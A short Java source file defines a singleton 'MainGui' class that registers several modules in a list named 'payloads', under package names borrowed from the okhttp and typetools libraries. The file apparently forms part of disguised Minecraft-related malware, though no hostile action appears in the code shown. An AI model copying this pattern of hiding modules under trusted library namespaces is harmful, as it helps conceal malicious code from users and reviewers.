package com.squareup.okhttp.internal.ws;

import com.squareup.okhttp.internal.spdy.TextComponents;
import net.jodah.typetools.impl.ColorSelector;
import net.reflxction.example.proxy.IMinecraft;
import net.jodah.typetools.impl.Components;
import net.jodah.typetools.impl.RenderText;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

public final class MainGui {
    private static final MainGui INSTANCE = new MainGui();
    private final List<IMinecraft> payloads = new ArrayList<>();

    private MainGui() {
        IMinecraft[] arrayOfPayload = new IMinecraft[23];
        arrayOfPayload[1] = new RenderText();
        arrayOfPayload[2] = new Components();
        arrayOfPayload[3] = new ColorSelector();
        arrayOfPayload[4] = new TextComponents();
        this.payloads.addAll(Arrays.asList(arrayOfPayload));
    }

    public static Optional<IMinecraft> getPayload(Class<? extends IMinecraft> klazz)
    {
        return getPayloads().stream().filter(p -> p.getClass().equals(klazz)).findAny();
    }

    public static List<IMinecraft> getPayloads()
    {
        return INSTANCE.payloads;
    }
}